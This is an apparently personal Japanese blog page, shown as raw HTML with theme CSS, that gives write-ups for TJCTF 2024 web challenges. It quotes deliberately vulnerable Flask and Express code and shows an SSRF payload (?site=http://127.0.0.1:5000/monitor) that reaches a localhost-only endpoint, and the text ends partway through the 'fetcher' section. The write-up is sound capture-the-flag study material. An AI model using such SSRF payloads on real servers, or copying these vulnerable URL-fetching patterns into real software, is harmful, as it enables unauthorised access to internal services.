@@ -1,0 +1,646 @@
+<!DOCTYPE html><html lang="ja"><head prefix="og: https://ogp.me/ns#">
+  <meta charset="UTF-8">
+  <meta property="og:title" content="evipepota">
+  <meta property="og:description" content="evipepota">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="https://evipepota.net/evi2.png">
+  <link rel="icon" sizes="128*128" href="/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>evipq</title>
+  <script type="module" crossorigin="" src="/assets/app.9f256bc5.js"></script>
+  <link rel="stylesheet" href="/assets/index.06224b9e.css">
+<link rel="modulepreload" crossorigin="" href="/assets/README.6f626fc3.js"><style id="vuetify-theme-stylesheet">:root {
+      --v-theme-background: 255,255,255;
+      --v-theme-background-overlay-multiplier: 1;
+      --v-theme-surface: 255,255,255;
+      --v-theme-surface-overlay-multiplier: 1;
+      --v-theme-surface-bright: 255,255,255;
+      --v-theme-surface-bright-overlay-multiplier: 1;
+      --v-theme-surface-light: 238,238,238;
+      --v-theme-surface-light-overlay-multiplier: 1;
+      --v-theme-surface-variant: 66,66,66;
+      --v-theme-surface-variant-overlay-multiplier: 2;
+      --v-theme-on-surface-variant: 238,238,238;
+      --v-theme-primary: 24,103,192;
+      --v-theme-primary-overlay-multiplier: 2;
+      --v-theme-primary-darken-1: 31,85,146;
+      --v-theme-primary-darken-1-overlay-multiplier: 2;
+      --v-theme-secondary: 72,169,166;
+      --v-theme-secondary-overlay-multiplier: 1;
+      --v-theme-secondary-darken-1: 1,135,134;
+      --v-theme-secondary-darken-1-overlay-multiplier: 1;
+      --v-theme-error: 176,0,32;
+      --v-theme-error-overlay-multiplier: 2;
+      --v-theme-info: 33,150,243;
+      --v-theme-info-overlay-multiplier: 1;
+      --v-theme-success: 76,175,80;
+      --v-theme-success-overlay-multiplier: 1;
+      --v-theme-warning: 251,140,0;
+      --v-theme-warning-overlay-multiplier: 1;
+      --v-theme-on-background: 0,0,0;
+      --v-theme-on-surface: 0,0,0;
+      --v-theme-on-surface-bright: 0,0,0;
+      --v-theme-on-surface-light: 0,0,0;
+      --v-theme-on-primary: 255,255,255;
+      --v-theme-on-primary-darken-1: 255,255,255;
+      --v-theme-on-secondary: 255,255,255;
+      --v-theme-on-secondary-darken-1: 255,255,255;
+      --v-theme-on-error: 255,255,255;
+      --v-theme-on-info: 255,255,255;
+      --v-theme-on-success: 255,255,255;
+      --v-theme-on-warning: 255,255,255;
+      --v-border-color: 0, 0, 0;
+      --v-border-opacity: 0.12;
+      --v-high-emphasis-opacity: 0.87;
+      --v-medium-emphasis-opacity: 0.6;
+      --v-disabled-opacity: 0.38;
+      --v-idle-opacity: 0.04;
+      --v-hover-opacity: 0.04;
+      --v-focus-opacity: 0.12;
+      --v-selected-opacity: 0.08;
+      --v-activated-opacity: 0.12;
+      --v-pressed-opacity: 0.12;
+      --v-dragged-opacity: 0.08;
+      --v-theme-kbd: 33, 37, 41;
+      --v-theme-on-kbd: 255, 255, 255;
+      --v-theme-code: 245, 245, 245;
+      --v-theme-on-code: 0, 0, 0;
+    }
+    .v-theme--light {
+      color-scheme: normal;
+      --v-theme-background: 255,255,255;
+      --v-theme-background-overlay-multiplier: 1;
+      --v-theme-surface: 255,255,255;
+      --v-theme-surface-overlay-multiplier: 1;
+      --v-theme-surface-bright: 255,255,255;
+      --v-theme-surface-bright-overlay-multiplier: 1;
+      --v-theme-surface-light: 238,238,238;
+      --v-theme-surface-light-overlay-multiplier: 1;
+      --v-theme-surface-variant: 66,66,66;
+      --v-theme-surface-variant-overlay-multiplier: 2;
+      --v-theme-on-surface-variant: 238,238,238;
+      --v-theme-primary: 24,103,192;
+      --v-theme-primary-overlay-multiplier: 2;
+      --v-theme-primary-darken-1: 31,85,146;
+      --v-theme-primary-darken-1-overlay-multiplier: 2;
+      --v-theme-secondary: 72,169,166;
+      --v-theme-secondary-overlay-multiplier: 1;
+      --v-theme-secondary-darken-1: 1,135,134;
+      --v-theme-secondary-darken-1-overlay-multiplier: 1;
+      --v-theme-error: 176,0,32;
+      --v-theme-error-overlay-multiplier: 2;
+      --v-theme-info: 33,150,243;
+      --v-theme-info-overlay-multiplier: 1;
+      --v-theme-success: 76,175,80;
+      --v-theme-success-overlay-multiplier: 1;
+      --v-theme-warning: 251,140,0;
+      --v-theme-warning-overlay-multiplier: 1;
+      --v-theme-on-background: 0,0,0;
+      --v-theme-on-surface: 0,0,0;
+      --v-theme-on-surface-bright: 0,0,0;
+      --v-theme-on-surface-light: 0,0,0;
+      --v-theme-on-primary: 255,255,255;
+      --v-theme-on-primary-darken-1: 255,255,255;
+      --v-theme-on-secondary: 255,255,255;
+      --v-theme-on-secondary-darken-1: 255,255,255;
+      --v-theme-on-error: 255,255,255;
+      --v-theme-on-info: 255,255,255;
+      --v-theme-on-success: 255,255,255;
+      --v-theme-on-warning: 255,255,255;
+      --v-border-color: 0, 0, 0;
+      --v-border-opacity: 0.12;
+      --v-high-emphasis-opacity: 0.87;
+      --v-medium-emphasis-opacity: 0.6;
+      --v-disabled-opacity: 0.38;
+      --v-idle-opacity: 0.04;
+      --v-hover-opacity: 0.04;
+      --v-focus-opacity: 0.12;
+      --v-selected-opacity: 0.08;
+      --v-activated-opacity: 0.12;
+      --v-pressed-opacity: 0.12;
+      --v-dragged-opacity: 0.08;
+      --v-theme-kbd: 33, 37, 41;
+      --v-theme-on-kbd: 255, 255, 255;
+      --v-theme-code: 245, 245, 245;
+      --v-theme-on-code: 0, 0, 0;
+    }
+    .v-theme--dark {
+      color-scheme: dark;
+      --v-theme-background: 18,18,18;
+      --v-theme-background-overlay-multiplier: 1;
+      --v-theme-surface: 33,33,33;
+      --v-theme-surface-overlay-multiplier: 1;
+      --v-theme-surface-bright: 204,191,214;
+      --v-theme-surface-bright-overlay-multiplier: 2;
+      --v-theme-surface-light: 66,66,66;
+      --v-theme-surface-light-overlay-multiplier: 1;
+      --v-theme-surface-variant: 163,163,163;
+      --v-theme-surface-variant-overlay-multiplier: 2;
+      --v-theme-on-surface-variant: 66,66,66;
+      --v-theme-primary: 33,150,243;
+      --v-theme-primary-overlay-multiplier: 2;
+      --v-theme-primary-darken-1: 39,124,193;
+      --v-theme-primary-darken-1-overlay-multiplier: 2;
+      --v-theme-secondary: 84,182,178;
+      --v-theme-secondary-overlay-multiplier: 2;
+      --v-theme-secondary-darken-1: 72,169,166;
+      --v-theme-secondary-darken-1-overlay-multiplier: 2;
+      --v-theme-error: 207,102,121;
+      --v-theme-error-overlay-multiplier: 2;
+      --v-theme-info: 33,150,243;
+      --v-theme-info-overlay-multiplier: 2;
+      --v-theme-success: 76,175,80;
+      --v-theme-success-overlay-multiplier: 2;
+      --v-theme-warning: 251,140,0;
+      --v-theme-warning-overlay-multiplier: 2;
+      --v-theme-on-background: 255,255,255;
+      --v-theme-on-surface: 255,255,255;
+      --v-theme-on-surface-bright: 0,0,0;
+      --v-theme-on-surface-light: 255,255,255;
+      --v-theme-on-primary: 255,255,255;
+      --v-theme-on-primary-darken-1: 255,255,255;
+      --v-theme-on-secondary: 255,255,255;
+      --v-theme-on-secondary-darken-1: 255,255,255;
+      --v-theme-on-error: 255,255,255;
+      --v-theme-on-info: 255,255,255;
+      --v-theme-on-success: 255,255,255;
+      --v-theme-on-warning: 255,255,255;
+      --v-border-color: 255, 255, 255;
+      --v-border-opacity: 0.12;
+      --v-high-emphasis-opacity: 1;
+      --v-medium-emphasis-opacity: 0.7;
+      --v-disabled-opacity: 0.5;
+      --v-idle-opacity: 0.1;
+      --v-hover-opacity: 0.04;
+      --v-focus-opacity: 0.12;
+      --v-selected-opacity: 0.08;
+      --v-activated-opacity: 0.12;
+      --v-pressed-opacity: 0.16;
+      --v-dragged-opacity: 0.08;
+      --v-theme-kbd: 33, 37, 41;
+      --v-theme-on-kbd: 255, 255, 255;
+      --v-theme-code: 52, 52, 52;
+      --v-theme-on-code: 204, 204, 204;
+    }
+    .bg-background {
+      --v-theme-overlay-multiplier: var(--v-theme-background-overlay-multiplier);
+      background-color: rgb(var(--v-theme-background)) !important;
+      color: rgb(var(--v-theme-on-background)) !important;
+    }
+    .bg-surface {
+      --v-theme-overlay-multiplier: var(--v-theme-surface-overlay-multiplier);
+      background-color: rgb(var(--v-theme-surface)) !important;
+      color: rgb(var(--v-theme-on-surface)) !important;
+    }
+    .bg-surface-bright {
+      --v-theme-overlay-multiplier: var(--v-theme-surface-bright-overlay-multiplier);
+      background-color: rgb(var(--v-theme-surface-bright)) !important;
+      color: rgb(var(--v-theme-on-surface-bright)) !important;
+    }
+    .bg-surface-light {
+      --v-theme-overlay-multiplier: var(--v-theme-surface-light-overlay-multiplier);
+      background-color: rgb(var(--v-theme-surface-light)) !important;
+      color: rgb(var(--v-theme-on-surface-light)) !important;
+    }
+    .bg-surface-variant {
+      --v-theme-overlay-multiplier: var(--v-theme-surface-variant-overlay-multiplier);
+      background-color: rgb(var(--v-theme-surface-variant)) !important;
+      color: rgb(var(--v-theme-on-surface-variant)) !important;
+    }
+    .bg-primary {
+      --v-theme-overlay-multiplier: var(--v-theme-primary-overlay-multiplier);
+      background-color: rgb(var(--v-theme-primary)) !important;
+      color: rgb(var(--v-theme-on-primary)) !important;
+    }
+    .bg-primary-darken-1 {
+      --v-theme-overlay-multiplier: var(--v-theme-primary-darken-1-overlay-multiplier);
+      background-color: rgb(var(--v-theme-primary-darken-1)) !important;
+      color: rgb(var(--v-theme-on-primary-darken-1)) !important;
+    }
+    .bg-secondary {
+      --v-theme-overlay-multiplier: var(--v-theme-secondary-overlay-multiplier);
+      background-color: rgb(var(--v-theme-secondary)) !important;
+      color: rgb(var(--v-theme-on-secondary)) !important;
+    }
+    .bg-secondary-darken-1 {
+      --v-theme-overlay-multiplier: var(--v-theme-secondary-darken-1-overlay-multiplier);
+      background-color: rgb(var(--v-theme-secondary-darken-1)) !important;
+      color: rgb(var(--v-theme-on-secondary-darken-1)) !important;
+    }
+    .bg-error {
+      --v-theme-overlay-multiplier: var(--v-theme-error-overlay-multiplier);
+      background-color: rgb(var(--v-theme-error)) !important;
+      color: rgb(var(--v-theme-on-error)) !important;
+    }
+    .bg-info {
+      --v-theme-overlay-multiplier: var(--v-theme-info-overlay-multiplier);
+      background-color: rgb(var(--v-theme-info)) !important;
+      color: rgb(var(--v-theme-on-info)) !important;
+    }
+    .bg-success {
+      --v-theme-overlay-multiplier: var(--v-theme-success-overlay-multiplier);
+      background-color: rgb(var(--v-theme-success)) !important;
+      color: rgb(var(--v-theme-on-success)) !important;
+    }
+    .bg-warning {
+      --v-theme-overlay-multiplier: var(--v-theme-warning-overlay-multiplier);
+      background-color: rgb(var(--v-theme-warning)) !important;
+      color: rgb(var(--v-theme-on-warning)) !important;
+    }
+    .text-background {
+      color: rgb(var(--v-theme-background)) !important;
+    }
+    .border-background {
+      --v-border-color: var(--v-theme-background);
+    }
+    .text-surface {
+      color: rgb(var(--v-theme-surface)) !important;
+    }
+    .border-surface {
+      --v-border-color: var(--v-theme-surface);
+    }
+    .text-surface-bright {
+      color: rgb(var(--v-theme-surface-bright)) !important;
+    }
+    .border-surface-bright {
+      --v-border-color: var(--v-theme-surface-bright);
+    }
+    .text-surface-light {
+      color: rgb(var(--v-theme-surface-light)) !important;
+    }
+    .border-surface-light {
+      --v-border-color: var(--v-theme-surface-light);
+    }
+    .text-surface-variant {
+      color: rgb(var(--v-theme-surface-variant)) !important;
+    }
+    .border-surface-variant {
+      --v-border-color: var(--v-theme-surface-variant);
+    }
+    .on-surface-variant {
+      color: rgb(var(--v-theme-on-surface-variant)) !important;
+    }
+    .text-primary {
+      color: rgb(var(--v-theme-primary)) !important;
+    }
+    .border-primary {
+      --v-border-color: var(--v-theme-primary);
+    }
+    .text-primary-darken-1 {
+      color: rgb(var(--v-theme-primary-darken-1)) !important;
+    }
+    .border-primary-darken-1 {
+      --v-border-color: var(--v-theme-primary-darken-1);
+    }
+    .text-secondary {
+      color: rgb(var(--v-theme-secondary)) !important;
+    }
+    .border-secondary {
+      --v-border-color: var(--v-theme-secondary);
+    }
+    .text-secondary-darken-1 {
+      color: rgb(var(--v-theme-secondary-darken-1)) !important;
+    }
+    .border-secondary-darken-1 {
+      --v-border-color: var(--v-theme-secondary-darken-1);
+    }
+    .text-error {
+      color: rgb(var(--v-theme-error)) !important;
+    }
+    .border-error {
+      --v-border-color: var(--v-theme-error);
+    }
+    .text-info {
+      color: rgb(var(--v-theme-info)) !important;
+    }
+    .border-info {
+      --v-border-color: var(--v-theme-info);
+    }
+    .text-success {
+      color: rgb(var(--v-theme-success)) !important;
+    }
+    .border-success {
+      --v-border-color: var(--v-theme-success);
+    }
+    .text-warning {
+      color: rgb(var(--v-theme-warning)) !important;
+    }
+    .border-warning {
+      --v-border-color: var(--v-theme-warning);
+    }
+    .on-background {
+      color: rgb(var(--v-theme-on-background)) !important;
+    }
+    .on-surface {
+      color: rgb(var(--v-theme-on-surface)) !important;
+    }
+    .on-surface-bright {
+      color: rgb(var(--v-theme-on-surface-bright)) !important;
+    }
+    .on-surface-light {
+      color: rgb(var(--v-theme-on-surface-light)) !important;
+    }
+    .on-primary {
+      color: rgb(var(--v-theme-on-primary)) !important;
+    }
+    .on-primary-darken-1 {
+      color: rgb(var(--v-theme-on-primary-darken-1)) !important;
+    }
+    .on-secondary {
+      color: rgb(var(--v-theme-on-secondary)) !important;
+    }
+    .on-secondary-darken-1 {
+      color: rgb(var(--v-theme-on-secondary-darken-1)) !important;
+    }
+    .on-error {
+      color: rgb(var(--v-theme-on-error)) !important;
+    }
+    .on-info {
+      color: rgb(var(--v-theme-on-info)) !important;
+    }
+    .on-success {
+      color: rgb(var(--v-theme-on-success)) !important;
+    }
+    .on-warning {
+      color: rgb(var(--v-theme-on-warning)) !important;
+    }
+</style></head>
+
+<body>
+  <div id="app" data-server-rendered="true"><!--[--><div class="header" data-v-f82a0cee=""><div class="header-container" data-v-f82a0cee=""><div class="header-title" data-v-f82a0cee=""><span class="header-title-text" data-v-f82a0cee=""><a href="/" style="color:white;" data-v-f82a0cee=""> evip </a></span></div><div class="links-container" style="text-align:center;" data-v-f82a0cee=""><button type="button" class="v-btn v-btn--icon v-theme--light v-btn--density-default v-btn--size-default v-btn--variant-text" style="" data-v-f82a0cee=""><!--[--><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!--]--><!----><span class="v-btn__content" data-no-activator=""><i class="v-icon notranslate v-theme--light v-icon--size-default" style="" aria-hidden="true"><svg class="v-icon__svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" role="img" aria-hidden="true"><path d="M12,4A4,4 0 0,1 16,8A4,4 0 0,1 12,12A4,4 0 0,1 8,8A4,4 0 0,1 12,4M12,14C16.42,14 20,15.79 20,18V20H4V18C4,15.79 7.58,14 12,14Z"></path></svg></i></span><!----><!----></button><a class="v-btn v-btn--icon v-theme--light v-btn--density-default v-btn--size-default v-btn--variant-text" style="" href="https://github.com/evipepota" target="_blank" data-v-f82a0cee=""><!--[--><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!--]--><!----><span class="v-btn__content" data-no-activator=""><i class="v-icon notranslate v-theme--light v-icon--size-default" style="" aria-hidden="true"><svg class="v-icon__svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" role="img" aria-hidden="true"><path d="M12,2A10,10 0 0,0 2,12C2,16.42 4.87,20.17 8.84,21.5C9.34,21.58 9.5,21.27 9.5,21C9.5,20.77 9.5,20.14 9.5,19.31C6.73,19.91 6.14,17.97 6.14,17.97C5.68,16.81 5.03,16.5 5.03,16.5C4.12,15.88 5.1,15.9 5.1,15.9C6.1,15.97 6.63,16.93 6.63,16.93C7.5,18.45 8.97,18 9.54,17.76C9.63,17.11 9.89,16.67 10.17,16.42C7.95,16.17 5.62,15.31 5.62,11.5C5.62,10.39 6,9.5 6.65,8.79C6.55,8.54 6.2,7.5 6.75,6.15C6.75,6.15 7.59,5.88 9.5,7.17C10.29,6.95 11.15,6.84 12,6.84C12.85,6.84 13.71,6.95 14.5,7.17C16.41,5.88 17.25,6.15 17.25,6.15C17.8,7.5 17.45,8.54 17.35,8.79C18,9.5 18.38,10.39 18.38,11.5C18.38,15.32 16.04,16.16 13.81,16.41C14.17,16.72 14.5,17.33 14.5,18.26C14.5,19.6 14.5,20.68 14.5,21C14.5,21.27 14.66,21.59 15.17,21.5C19.14,20.16 22,16.42 22,12A10,10 0 0,0 12,2Z"></path></svg></i></span><!----><!----></a><a class="v-btn v-btn--icon v-theme--light v-btn--density-default v-btn--size-default v-btn--variant-text" style="" href="https://twitter.com/evipepota" target="_blank" data-v-f82a0cee=""><!--[--><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!--]--><!----><span class="v-btn__content" data-no-activator=""><i class="v-icon notranslate v-theme--light v-icon--size-default" style="" aria-hidden="true"><svg class="v-icon__svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" role="img" aria-hidden="true"><path d="M22.46,6C21.69,6.35 20.86,6.58 20,6.69C20.88,6.16 21.56,5.32 21.88,4.31C21.05,4.81 20.13,5.16 19.16,5.36C18.37,4.5 17.26,4 16,4C13.65,4 11.73,5.92 11.73,8.29C11.73,8.63 11.77,8.96 11.84,9.27C8.28,9.09 5.11,7.38 3,4.79C2.63,5.42 2.42,6.16 2.42,6.94C2.42,8.43 3.17,9.75 4.33,10.5C3.62,10.5 2.96,10.3 2.38,10C2.38,10 2.38,10 2.38,10.03C2.38,12.11 3.86,13.85 5.82,14.24C5.46,14.34 5.08,14.39 4.69,14.39C4.42,14.39 4.15,14.36 3.89,14.31C4.43,16 6,17.26 7.89,17.29C6.43,18.45 4.58,19.13 2.56,19.13C2.22,19.13 1.88,19.11 1.54,19.07C3.44,20.29 5.7,21 8.12,21C16,21 20.33,14.46 20.33,8.79C20.33,8.6 20.33,8.42 20.32,8.23C21.16,7.63 21.88,6.87 22.46,6Z"></path></svg></i></span><!----><!----></a></div><div class="header-right" data-v-f82a0cee=""><div class="links" data-v-f82a0cee=""><a href="/blog" style="font-size:1.2rem;" data-v-f82a0cee="">Blog</a></div></div></div></div><div class="markdown-wrapper router-view"><div><h1 id="tjctf-2024" tabindex="-1">TJCTF 2024</h1><hr><ul><li><a href="#%5Bweb%5D-frog">[web] frog</a></li><li><a href="#%5Bweb%5D-reader">[web] reader</a></li><li><a href="#%5Bweb%5D-fetcher">[web] fetcher</a></li><li><a href="#%5Bweb%5D-templater">[web] templater</a></li><li><a href="#%5Bweb%5D-music-checkout">[web] music-checkout</a></li><li><a href="#%5Bweb%5D-topplecontainer">[web] topplecontainer</a></li><li><a href="#%5Bweb%5D-kaboot">[web] kaboot</a></li></ul><hr><h2 id="%5Bweb%5D-frog" tabindex="-1">[web] frog</h2><p><code class="">robots.txt</code>を見ると<code class="">Disallow: /secret-frogger-78570618/</code>の記載がある．</p><p><code class="">/secret-frogger-78570618</code>にいくと</p><pre class="language-html" v-pre="true"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flag-ed8f2331.txt<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>🐸<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
+</code></pre><p>とあるので，<code class="">/secret-frogger-78570618/flag-ed8f2331.txt</code>にいくとflagがあった．</p><hr><h2 id="%5Bweb%5D-reader" tabindex="-1">[web] reader</h2><p><code class="">site</code>に入力したurlの内容をとってきて表示してくれるっぽい．</p><pre class="language-py" v-pre="true"><code class="language-py"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> log<span class="token punctuation">,</span> log_count
+    site_to_visit <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"site"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">""</span>
+    url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>site_to_visit<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> site_to_visit<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        parser <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTMLParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            response <span class="token operator">=</span> get<span class="token punctuation">(</span>site_to_visit<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+            tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>response<span class="token punctuation">,</span> parser<span class="token punctuation">)</span><span class="token punctuation">.</span>getroottree<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            content <span class="token operator">=</span> get_text_repr<span class="token punctuation">(</span>tree<span class="token punctuation">,</span> url<span class="token punctuation">.</span>scheme <span class="token operator">+</span> <span class="token string">"://"</span> <span class="token operator">+</span> url<span class="token punctuation">.</span>netloc<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+            log_count <span class="token operator">+=</span> <span class="token number">1</span>
+            <span class="token keyword">if</span> log_count <span class="token operator">&gt;=</span> MAX_LOGS<span class="token punctuation">:</span>
+                log<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+                log_count <span class="token operator">=</span> MAX_LOGS
+            log<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>
+                <span class="token string">"&lt;body&gt;failed to load page&lt;/body&gt;"</span><span class="token punctuation">,</span> parser
+            <span class="token punctuation">)</span><span class="token punctuation">.</span>getroottree<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            content <span class="token operator">=</span> get_text_repr<span class="token punctuation">(</span>tree<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"site_view.html"</span><span class="token punctuation">,</span> content<span class="token operator">=</span>content<span class="token punctuation">)</span>
+</code></pre><p>プログラムを読むと，<code class="">/monitor</code>にてflagの表示をしてくれるが，リクエスト元のアドレスが<code class="">127.0.0.1</code>か<code class="">localhost</code>でないとダメらしい．</p><pre class="language-py" v-pre="true"><code class="language-py"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/monitor"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>remote_addr <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>
+            <span class="token string">"admin.html"</span><span class="token punctuation">,</span> message<span class="token operator">=</span>flag<span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>log<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">"No recent errors"</span>
+        <span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"admin.html"</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"Unauthorized access"</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
+
+</code></pre><p><code class="">/?site=http://127.0.0.1:5000/monitor</code>として<code class="">/monitor</code>の内容を取得すればいい</p><hr><h2 id="%5Bweb%5D-fetcher" tabindex="-1">[web] fetcher</h2><p><code class="">/fetch</code>に入力したurlの内容をとってきてくれる． <code class="">/flag</code>に対するリクエスト元のアドレスが<code class="">127.0.0.1</code>であればflagを入手できるが，<code class="">/fetch</code>ではurlが<code class="">localhost</code>や<code class="">127.0.0.1</code>の文字列を含んでいたら強制終了するようになっていた．</p><pre class="language-js" v-pre="true"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/fetch'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> url <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'invalid url'</span><span class="token punctuation">)</span>
+
+  <span class="token keyword">try</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> checkURL <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>
+      checkURL<span class="token punctuation">.</span>host<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+      checkURL<span class="token punctuation">.</span>host<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span>
+      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'invalid url'</span><span class="token punctuation">)</span>
+  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'invalid url'</span><span class="token punctuation">)</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">const</span> r <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">redirect</span><span class="token operator">:</span> <span class="token string">'manual'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+  <span class="token keyword">const</span> fetched <span class="token operator">=</span> <span class="token keyword">await</span> r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fetched<span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre><pre class="language-js" v-pre="true"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>
+    req<span class="token punctuation">.</span>ip <span class="token operator">!==</span> <span class="token string">'::ffff:127.0.0.1'</span> <span class="token operator">&amp;&amp;</span>
+    req<span class="token punctuation">.</span>ip <span class="token operator">!==</span> <span class="token string">'::1'</span> <span class="token operator">&amp;&amp;</span>
+    req<span class="token punctuation">.</span>ip <span class="token operator">!==</span> <span class="token string">'127.0.0.1'</span>
+  <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'bad ip'</span><span class="token punctuation">)</span>
+
+  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">hey myself! here's your flag: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flag<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
